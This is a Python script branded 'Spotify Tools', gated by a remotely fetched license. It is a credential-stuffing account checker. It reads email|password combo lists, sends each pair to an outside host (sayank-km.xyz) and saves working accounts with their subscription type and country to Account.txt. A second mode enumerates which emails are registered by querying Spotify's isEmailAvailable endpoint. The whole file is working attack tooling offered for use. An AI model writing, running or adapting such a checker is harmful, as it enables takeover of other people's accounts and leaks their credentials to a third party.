import urllib2
import requests
import urllib
import time
import sys
import os
import json
import base64
from socket import timeout
from termcolor import colored
from colorama import Fore, Back, Style

merah = "\033[01;31m{0}\033[00m"
hijau = "\033[01;35m{0}\033[00m"

w = merah.format(" _   ___                  _   _     \n")
gans = merah.format("| | / (_)                | | | |    \n")
sangat = merah.format("| |/ / _ _ __ _ __   __ _| |_| |__  \n")
kirnath = merah.format("|    \| | '__| '_ \ / _` | __| '_ \ \n")
coded = merah.format("| |\  \ | |  | | | | (_| | |_| | | |\n")
me = merah.format("\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|\n")
exit = "[========]"
for l in w:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.05)
for l in gans:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.05)
for l in sangat:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.05)
for l in coded:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.05)
for l in me:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.05)
print hijau.format("                       Spotify Tools\n")
def acc():
	read_license = urllib2.urlopen("https://mee-kirnath.c9users.io/license.txt")
	license = read_license.read()
	input_license = str(raw_input("License?: "))
	if input_license != license:
		try:
			print "License Not Valid !"
			
			sys.exit(1)
			
		except TypeError:
			print "Exiting......"
	else:
		print "[+] License is Valid !"
		time.sleep(2)
		print "[+] Starting......."
		time.sleep(2)
		try:
			emaillist = str(raw_input("[+] Enter List File: "))
		except NameError:
			print "[+] File Not Found!"
			time.sleep(1)
			print "[+] Exiting..."
			sys.exit(2)
		readfile = open(emaillist, "r")
		done = hijau.format("[+] Done! Result was Saved as Account.txt")
		for line in readfile:
			data = line.split("|")
			a = data[0]
			b = data[1]
			
			respon = urllib2.urlopen("http://sayank-km.xyz/api/?email={}&pass={}".format(a,b), timeout=360)
			reason = respon.read()
			resp = json.loads(reason)
			data_b = (b).replace("\n", "")
			if "success" not in reason:
				print (Fore.RED + "DIE ==>"),a,"|",data_b
				
			else:
				negara = resp["Negara"]
				data_negara = (negara[0]).replace("[", "")
				print (Fore.GREEN + "LIVE ==>"),a,"|",data_b,"|","Type:",resp["subscription"],"|","Negara:",data_negara
				live = "LIVE ==> {}|{}|Type: {}|Negara: {}".format(a,data_b,resp["subscription"],data_negara)
				save = str(live)
				file = open('Account.txt', 'a')
				file.write(save+'\n')
				
		print done
def email():
	try:
		emaillist = str(raw_input("Enter List File: "))
	except FileNotFoundError as e:
		error = merah.format("Exiting......\n")
		for l in error:
			sys.stdout.write(l)
			sys.stdout.flush()
			time.sleep(0.2)
			print error
	else:
		readfile = open(emaillist, "r")
		for line in readfile:
			data = line.split("\n")
			a = data[0]
			quote_email = urllib.quote(a)
			respon = urllib2.urlopen("https://www.spotify.com/id/xhr/json/isEmailAvailable.php?email={}".format(quote_email))
			reason = respon.read()
			if "false" not in reason:
				print (Fore.RED + "DIE ==>"),a
			else:
				print (Fore.GREEN + "LIVE ==>"),a
				live = "LIVE ==>",a
				save = str(live)
				done = merah.format("Done! Result was Saved as Valid.txt")
				file = open('Valid.txt', 'a')
				file.write(save+'\n')
			print done

print "Menu :"
print "1. Spotify Account Checker"
print "2. Email Valid Spotify"
put = raw_input("Choose: ")
if (put == "1"):
	os.system("cls" if os.name == "nt" else "clear")
	print merah.format(" _   ___                  _   _     ")
	print merah.format("| | / (_)                | | | |    ")
	print merah.format("| |/ / _ _ __ _ __   __ _| |_| |__  ")
	print merah.format("|    \| | '__| '_ \ / _` | __| '_ \ ")
	print merah.format("| |\  \ | |  | | | | (_| | |_| | | |")
	print merah.format("\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|")
	print merah.format("             -Spotify Account Checker")
	acc()

if (put == "2"):
	os.system("cls" if os.name == "nt" else "clear")
	print merah.format(" _   ___                  _   _     ")
	print merah.format("| | / (_)                | | | |    ")
	print merah.format("| |/ / _ _ __ _ __   __ _| |_| |__  ")
	print merah.format("|    \| | '__| '_ \ / _` | __| '_ \ ")
	print merah.format("| |\  \ | |  | | | | (_| | |_| | | |")
	print merah.format("\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|")
	print merah.format("             -Spotify Email Validator")	
	email()